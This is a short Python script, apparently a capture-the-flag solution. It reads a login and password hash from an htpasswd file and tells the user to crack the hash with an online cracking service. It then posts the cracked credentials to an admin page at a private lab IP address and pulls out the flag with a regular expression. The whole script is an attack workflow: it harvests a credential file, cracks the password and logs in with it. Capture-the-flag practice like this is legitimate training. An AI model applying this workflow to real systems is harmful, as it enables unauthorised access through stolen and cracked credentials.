#! /usr/bin/env python3
import requests
import re

file = open("htpasswd", 'r')
line = file.readline()
line = line.split('\n')[0]
file.close()

tab = line.split(':')
login = tab[0]
passwd_hashed = tab[1]

print("Please use an online hash cracked (https://crackstation.net/) with this hash :\n%s" % passwd_hashed)
password = input("Enter the result :\n> ")

s = requests.Session()
ret = s.post("http://192.168.1.48/admin/#", data={'username': login, 'password': password, "Login": "Login"})
rx = re.compile(r'.*The flag is\s:\s(([a-z]|[0-9])*)\s.*')
flag = rx.match(ret.text)
flag = flag.group(1)
print("The flag is:\n%s" % flag)
